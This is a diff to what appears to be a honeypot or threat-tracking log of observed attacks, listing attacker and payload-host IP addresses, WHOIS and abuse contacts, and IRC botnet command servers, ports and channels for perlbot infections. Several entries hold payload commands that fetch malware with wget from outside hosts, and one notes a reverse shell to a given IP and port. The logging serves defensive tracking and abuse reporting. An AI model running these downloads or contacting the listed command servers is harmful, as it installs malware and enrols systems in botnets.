@@ -812,6 +812,7 @@ abuse@ripe.net
 AS41044
 Notes:
 -Seen this payload before, but from a new Pitcher.
+-Being pitched from: 200.203.146.78
 
 Pitcher: 192.3.140.202
 Catcher: 46.36.35.162
@@ -842,6 +843,66 @@ AS51731
 Notes:
 -Not really subtle. "bot.pl"
 -Also sends back a reverse shell to 192.13.140.202 on port 3133
+
+Pitcher: 95.141.37.112
+Catcher: 89.33.193.10
+Nslookup (pitcher): 112-37.141.95.serverdedicati.seflow.it.
+WHOIS (pitcher):
+95.141.32.0/20
+SeFlow.it Internet Services
+IT
+abuse@seflow.net
+AS49367
+NSlookup (catcher): kiprosmarket.in.
+WHOIS (catcher):
+89.33.193.0/24
+FIBER-UPLOAD-SRL
+RO
+abuse@ip.ro
+Payload: wget http://89.33.193.10/ju
+Description: perlbot
+Server: 64.235.56.228
+Port: 443
+Channel: #bot
+NSlookup: lasvegas-nv-datacenter.com
+WHOIS:
+64.235.32.0/19
+PremiaNet
+US
+noc@premianet.com, support@premianet.com
+AS26277
+Notes:
+- Also being pitched from: 173.209.59.50, 184.171.252.186
+
+Pitcher: 176.31.93.211
+Catcher: 68.68.2.217
+Nslookup (pitcher):
+WHOIS (pitcher):
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: wget http://68.68.2.217/fix.txt
+Description: perlbot 
+Server: 201.161.20.106
+Port: 6667
+Channel: #vcv
+NSlookup:
+WHOIS:
+Notes:
+
+Pitcher: 64.15.147.111
+Catcher: legendsoftwares.com
+Nslookup (pitcher):
+WHOIS (pitcher):
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: wget http://legendsoftwares.com/legend.txt
+Description:
+Server: fantasy.legend.rocks
+Port: 7777
+Channel: #apache
+NSlookup:
+WHOIS:
+Notes:
 
 #Template. CHOOSE YOUR OWN ADVENTURE!
 Pitcher:
